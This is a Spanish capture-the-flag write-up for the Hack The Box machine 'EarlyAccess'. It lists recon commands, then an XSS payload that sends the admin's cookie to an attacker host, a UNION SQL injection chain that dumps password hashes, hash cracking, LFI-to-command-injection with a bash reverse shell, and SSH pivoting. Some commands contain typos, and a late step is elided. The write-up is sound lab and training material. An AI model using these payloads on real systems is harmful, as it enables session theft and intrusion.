---
title: "EarlyAccess"
description: "EarlyAccess"
pubDate: 2025-05-20
---

https://app.hackthebox.com/machines/EarlyAccess

# Fase de reconocimiento

## Buscamos puertos abiertos

````
nmap -sS -p- -T5 --min-rate=5000 -vvv -Pn -n 10.10.11.110
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020241210102323.png)

## Reconocimiento de servicios

````
nmap -sCV -p22,80,443 10.10.11.110
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020241210102438.png)

## Añadir /etc/hosts

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020241210102834.png)

## Buscamos posibles subdominos y info en certificado

````
openssl s_client -connect 10.10.11.110:443
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020241210103809.png)
Vemos el correo de un usuario

## 

````
gobuster dir -u https://earlyaccess.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20
````

# Fase de ataque

## XSS + Cookie Hijacking

Hay un contact con admin y Cambiando el nombre de perfil, puedes inyectar html

1. Cambiamos el nombre

````
<script>document.location="http://10.10.14.10:8080/?cookie="+document.cookie</script>
````

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020241210110410.png)
2. Nos ponemos en escucha

````
python3 -m http.server 8080
````

3. Mandamos un mensaje al admin

![](https://uuqke3c479llohf3.public.blob.vercel-storage.com/Pasted%20image%2020241210110428.png)
Cambiamos las cookies
¡admin!

## Key-validator analysis (s4vitar video)

Vemos que hace el código para validar y creamos una clave dejuego valida.

Asignamos la clave a una cuenta (ej. prueba@prueba.com)
Entramos en la pagina del game

## SQLI

Metemos un SQLI en el perfil que sera refeljado en el scoreboard.
Probamos que sea vulnerable

````
prueba'
````

Como es vulnerable, buscamos los datos en BBDD
Buscamos el total de columnas

````
prueba') order by 3-- -
````

````
prueba') union 1,2,database()-- -
````

````
prueba') union 1,2,schema_name from information_schema.schemata-- -
````

````
prueba') union 1,2,table_name from information_schema.tables where table_schema='db'- -
````

````
prueba') union 1,2,column_name from information_schema.columns where table_schema='db' and table_name='users'- -
````

````
prueba') union 1,2,group_concat(name,0x3a,password) from users- -
````

Nos da unas contraseñas hasheadas

## Crack

````
john -wordlist=/usr/share/wordlists/rockyou.txt hashes
````

Sale cotraseña admin - gameover

Iniciamos sesion en dev.

## Fuzz de archivos php en la web

````
wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium-txt -H "Cookie: PHPSESSID=<cookie>" "http://dev.earlyaccess.htb/actions/FUZZ.php"
````

Encontramos file.php

### Fuzz de parametro de insertar archivo

````
wfuzz -c --hc=404 -hh=35 -t 200 -w /usr/share/secList/Discovery/Web-Content/burp-parameter-names.txt -H "Cookie: PHPSESSID=<cookie>" "http://dev.earlyaccess.htb/actions/file.php?FUZZ=test"
````

Enocntramos que es ?filepath=

## LFI

Podemos llegar a ver el php integro de la opcion de hash y vemos que podemos modificar el metodo de hasheo añadiendo debug en los parametros
Insertamos en el parametro de funciones un comando para ejuctar comandos y en la password a hashear el comando

````
hash_functions=system
````

````
password=bash -c 'bash -i >& /dev/tcp/<ipa>/443 0&1'    (urlencode)
````

Nos ponemos en escucha

````
nc -nlvp 443
````

\[-\] ==pwned!==

# Privilege Escalation

## Exit docker container

Reutilizacion de credenciales para ir al usuario www-adm

* En el usuario hay credenciales de un api
* Hay una API corriendo en local

````
nc API 80
````

### Escaneo puertos bash

````bash
#!/bin/bash
function ctrl_c(){
	echo -e "\n\n[!] Saliendo..."
	exit 1
}
trap ctrl_c INT

for port in $(seq 1 65535); do
	tiemout 1 bash -c "echo '' > /dev/tcp/<ipd>/$port" 2>/dev/null && echo "[+] POrt $port open" &
	
done, wait

````

En el puerto 5000 esta la API y hay configuracion

````
wget http://<ipd>:5000/check_db
````

Encontramos usuario y contraseña de base de datos y root

Nos conectamos a la maquina real con ssh y usuario drew

## Desde maquina real

Encontramos un .ssh/id_rsa.pub con una publica de otra maquina

Encontramos la maquina para conectarnos por ssh (172.19.0.3)

Nos conectamos

...(mucho texto)

\[+\] ==pwned!==
